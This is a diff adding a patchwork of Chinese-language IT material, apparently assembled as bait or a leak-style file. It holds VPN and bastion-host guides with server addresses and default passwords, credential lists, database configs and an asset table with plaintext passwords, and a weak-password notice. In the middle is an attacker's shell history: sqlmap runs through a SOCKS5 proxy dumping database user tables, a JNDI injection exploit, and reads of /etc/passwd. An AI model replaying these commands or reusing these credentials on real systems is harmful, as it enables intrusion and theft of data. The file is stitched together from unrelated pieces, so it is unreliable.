@@ -1,6 +1,245 @@
+Android手机VPN安装指南
+第一步： 打开手机主菜单，选择“设置”，然后选择“无线和网络” 
+ 
+第二步：选择“虚拟专用网设置” 
+ 
+第三步：选择“添加虚拟专用网” 
+ 
+第四步：选择“添加L2TP/IPSec PSK VPN” 
+ 
+第五步：点击输入虚拟专用网名称“l2tp”（此名称可自己随便定义） 
+ 
+第六步：点击填写您所登录的服务器地址219.26.10.120，点击“确定” 
+ 
+第七步：选择“设置IPSec预共享密钥”，共享密钥为“123456”，（注意不要勾选 “启用L2TP密钥”） 
+ 
+第八步： “启用L2TP密钥”不能勾上，DNS搜索范围不用填写，然后返回。
+ 
+ 
+第九步：点击刚创建的VPN连接登录，用户名和密码为校园信息门户用户名（工号或学号）和密码。
+（如：学号：2021140822，初始密码为123456）
+
+
+
+
+研发区
+ host 
+ host 
+ host 
+root
+Pass@word!!!
+
+
+163邮箱
+ email 
+13666628123
+Huawei@123456
+
+
+ host 
+root
+2!Um37hvjk
+
 spring:
   datasource:
     url: jdbc: url 
     driver-class-name: com.mysql.jdbc.Driver
     username: xxlab
     password: lab@998877
+
+<bean id="dataSource" class="org.apache.commons.dbcp.BasicDataSource" destroy-method="close">
+    <property name="driverClassName" value="com.mysql.jdbc.Driver"/>
+    <property name="url" value="jdbc: url "/>
+    <property name="username" value="root"/>
+    <property name="password" value="HHHLab@2022"/>
+</bean>
+
+
+db.driver=com.mysql.jdbc.Driver
+db.url=jdbc: url 
+db.username=sysadmin
+db.password=kllSJkd!@777
+
+
+sqlmap -r 1.txt --force-ssl --random-agent --dbms=PostgreSQL --proxy="socks5:// host :4781" -D public -T BH_CONFIG  --dump
+cd Desktop
+cat 1.txt
+vim shell.c
+cd /etc/nginx/conf.d
+vim zabbix.conf
+service nginx start
+vim zabbix.conf
+service nginx re
+service nginx restart
+vim zabbix.conf
+service nginx restart
+vim zabbix.conf
+nginx -t
+service nginx restart
+apt-get install cmake-curses-gui
+apt-get update
+apt-get install cmake-curses-gui
+exit
+service ssh start
+systemctl enable ssh 
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT executable  -C " executable "
+service apache2 start
+ifconfig
+cd /var/www/html
+open ./
+service apache2 start
+service nginx status
+cd /etc/nginx
+netstat -ntlp
+service apache2 stop
+cd conf.d
+vim zabbix.conf
+ifconfig
+whaomi
+cat /etc/passwd
+passwd zther0
+ifconfig
+nmap  host     
+ping  host 
+sqlmap --help
+ifconfig
+cd Desktop
+vim 2.txt
+touch 2.txt
+ifconfig
+apt-get install redis-cli
+./create_dev_user.sh TestUser900 TestUser900
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re --dbs
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re -D mysql --tabels
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re -D mysql --tables
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re -D mysql -T mysql --columns
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re -D mysql -T User --columns
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re -D mysql -T user --columns
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re -D mysql -T user -h
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re -D mysql -T user -hh
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re -D mysql -T user --dump 
+ls
+cd dump
+ls
+cd mysql
+ls
+cat user.csv
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re -D mysql -T user --dump-file
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re -D mysql -T user --dump --batch 3
+ls
+cat user.csv
+cat user.csv.1
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re -D mysql -T user --dump --start=1 --stop=1
+ls
+rm user.csv
+rm user.csv.1
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re -D mysql -T user --dump --start=1 --stop=1
+cat user.csv
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re -D mysql -T user --dump --start=0 --stop=1
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re -D mysql -T user --dump --start=1 --stop=2
+ls
+cat user.csv
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re -D mysql -T user --dump --start=1 --stop=2 --dump-format
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re -D mysql -T user --dump --start=1 --stop=2 -hh 
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re -D mysql -T user --dump --start=1 --stop=2 -hh  | grep dump
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re -D mysql -T user --dump --start=1 --stop=2 --dump-format SQLITE
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re -D mysql -T user --dump --start=1 --stop=2 --dump-format CSV
+sqlmap -u " url " --batch --level=5 --risk=3 --output-dir /root/sql_re -D mysql -T user --dump --start=1 --stop=200 --dump-format CSV
+mysql -h  host  -uroot    
+
+
+客户端使用手册(Windows)
+一、安装
+（一）确定服务器的操作系统位数
+Windws xp、2000、2003系统，在我的电脑属性里，可以很明显地看到标识。如果没有注明是64位的，那么默认就是32位的
+Windows 7 系统在控制面板，点击系统，在系统类型里，标注有操作系统位数
+（二）安装VPN客户端
+VPN客户端分为32位系统和64位系统二种，安装时，必须按上一步中检测到的系统进行安装，系统为32位则必须安装32位系统，系统为64位必须安装64位系统，安装过程如下：
+   注意事项：
+   必须以管理员登录进行安装，并且确定操作系统位数
+  按照操作系统类型双击合适的安装包：
+ 
+2.启动安装程序，直接点击“下一步”按钮
+ 
+3.选择安装目录，选择好以后点击“下一步”按钮
+ 
+4.程序将自动启动安装，安装完毕后，点击完成按钮即可以退出安装
+ 
+
+二、VPN使用
+（一）网络条件
+默认情况下堡垒机已经安装好了VPN系统，不需要进行额外的设置，VPN使用的是TCP 8443端口，因此，使用VPN功能前，需要在防火墙上对公网打开堡垒机的TCP 8443端口，移动用户即可以连接使用。
+（二）用户使用
+1.启动VPN系统，VPN安装好以后，在菜单中会产生一个VPN的菜单，点击菜单里的VPN即可以启动VPN软件 
+ 
+VPN启动后在Windows右下角的工具栏会产生一个图标：
+ 
+2.设置VPN服务器，鼠标右击VPN图标，选择“系统配置”菜单
+ 
+系统会打开VPN服务器对话框，在服务器1中输入堡垒机外网IP，点击确认按钮即完成设置
+ 
+3．用户使用，鼠标右击VPN图标，选择“连接”菜单，即可以进行连接，在连接对话框中输入堡垒机的用户名、密码，即可以登录：
+用户名：admin
+默认密码：admin@1234567890（请及时修改）
+ 
+登录后，VPN图标即可以显示为绿色，这时即可以通过堡垒机访问内网
+ 
+4.VPN连通后访问堡垒机： VPN连通后，堡垒机内网IP 为10.11.0.1，通过访问堡垒机这个IP，就可以实现对内网的运维（关于堡垒机操作请参考堡垒机使用手册）
+
+（三）VPN程序卸载
+1.VPN程序卸载，在开始菜单中选择VPN菜单里的UNWISE,即可以开始卸载程序
+ 
+  默认选择自动模式，点击下一步
+ 
+点击完成后即完成卸载
+ 
+设备名称/编号	设备类型	设备地址	用户名	密码	使用人	部门	资产状态	资产归属
+AID0006788	计算机	 host 	user1	eNnBjPvDKQkXFvB0KMm7dyKSv7YEdt2i	张三	IT部门	在用	xx公司
+AID0006789	打印机	 host 			王五	行政部	在用	xx公司
+AID0006790	网络设备	 host 	admin	mHCkEvo0MounX2nNdAYy5hKImVU8ssnN	李四	IT部门	闲置	xx公司
+AID0006791	计算机	 host 	user4	w7iWjVrO2sr6kJbM8R718zzLCi3P3pRt	赵六	销售部	在用	xx公司
+AID0006792	打印机	 host 			刘七	行政部	在用	xx公司
+AID0006793	网络设备	 host 	admin	CeVgn705JcPDKseYzfLeVcWwqyFIzoHv	王二	IT部门	维修中	xx公司
+AID0006794	计算机	 host 	user7	7GMXOgUE2PNzyUkR3zWuxsF8b0YUUZlS	张三	销售部	在用	xx公司
+AID0006795	打印机	 host 			王五	行政部	闲置	xx公司
+AID0006796	网络设备	 host 	admin	oVhmUA0VC36zkv1EceV4g6BFsc0ldprw	李四	IT部门	在用	xx公司
+AID0006797	计算机	 host 	user10	QM1B7rBAFpXBM0GKZHmw4JinWvloTHWh	赵六	销售部	在用	xx公司
+AID0006798	打印机	 host 			刘七	行政部	维修中	xx公司
+AID0006799	网络设备	 host 	admin	aOuoMnJcWLDIH2zXHMJVh31eBF50MOgP	王二	IT部门	闲置	xx公司
+AID0006800	计算机	 host 	user13	q3dI62egikbHAAQ3yWAjkbzqilFPOy0T	张三	销售部	在用	xx公司
+AID0006801	打印机	 host 			王五	行政部	在用	xx公司
+AID0006802	网络设备	 host 	admin	Zhyl01VUvSXXrOvIlkCUvC7dr4zr5fuZ	李四	IT部门	闲置	xx公司
+AID0006803	计算机	 host 	user16	DaLVPy081rEEXxQ4PuHevnqYcOZMrmmR	赵六	销售部	维修中	xx公司
+AID0006804	打印机	 host 			刘七	行政部	在用	xx公司
+AID0006805	网络设备	 host 	admin	neCTfWo5wH4Dqm3sGbvxt6I6sCvRseAH	王二	IT部门	在用	xx公司
+AID0006806	计算机	 host 	user19	f1kfr6vJ8O4aBoSSvha16SDqCUXa78i3	张三	销售部	闲置	xx公司
+AID0006807	打印机	 host 			王五	行政部	在用	xx公司
+AID0006808	网络设备	 host 	admin	DNfUeEi65Wt7uEgAnNcDES9UKkayTZGI	李四	IT部门	在用	xx公司
+AID0006809	计算机	 host 	user22	MnJbhF2i5DadB0MaB0IqaIf9D4XtZQ15	赵六	销售部	维修中	xx公司
+AID0006810	打印机	 host 			刘七	行政部	闲置	xx公司
+AID0006811	网络设备	 host 	admin	OCpj00kDh6sZONWzBcNBr1fDa95zBjXe	王二	IT部门	在用	xx公司
+AID0006812	计算机	 host 	user25	Zq8yO5u9KDxowGe3cygppfj2pkyT9YMn	张三	销售部	在用	xx公司
+AID0006813	打印机	 host 			王五	行政部	闲置	xx公司
+AID0006814	网络设备	 host 	admin	V8smxUNdyb66XalR7pHbf71QIlKsbu1J	李四	IT部门	在用	xx公司
+
+致xxxx研发部门员工：
+IT在进行定期安全审查时，发现我们公司内部的一些系统存在弱口令漏洞的问题。这种问题极大地降低了公司的网络安全性，可能会被黑客利用，对公司数据和信息安全造成严重威胁。
+以下是漏洞详细信息，希望大家尽快进行修改和整改：
+编号	IP地址	操作系统	弱口令漏洞描述	弱口令详情	责任人	建议整改措施	完成整改的截止日期
+1	 host 	Windows 10	管理员密码过于简单	密码为'123456'	苍霜	更新为强口令	2023年5月30日
+2	 host 	Linux CentOS	root用户密码为默认	密码为'root'	京翰	更新为强口令	2023年5月30日
+3	 host 	Windows Server	RDP口令过于简单	密码为'admin'	闫文丽	更新为强口令	2023年5月30日
+4	 host 	Ubuntu	SSH口令默认	密码为'ubuntu'	说凝竹	更新为强口令	2023年5月30日
+5	 host 	MacOS	root用户密码为默认	密码为'root'	别芳润	更新为强口令	2023年5月30日
+6	 host 	Windows 10	管理员密码过于简单	密码为'admin'	么方方	更新为强口令	2023年5月30日
+7	 host 	Linux CentOS	root用户密码为默认	密码为'root'	庞康德	更新为强口令	2023年5月30日
+
+
+注：1.所有收到此邮件的人员在给定的截止日期之前完成对应的整改措施，确保网络安全。
+2.提高网络安全意识，避免使用过于简单或默认的口令。
+3.口令长度至少八位长度、包含数字、大小写字母、特殊符号。
+IT将在整改截止日期后进行再次的安全审查，希望届时所有的安全漏洞都能得到修复。如果在整改过程中有任何问题，或者需要帮助，请随时联系IT技术支持。
+感谢你们的理解和合作。
+IT安全运营部
+ITService@ host 
+
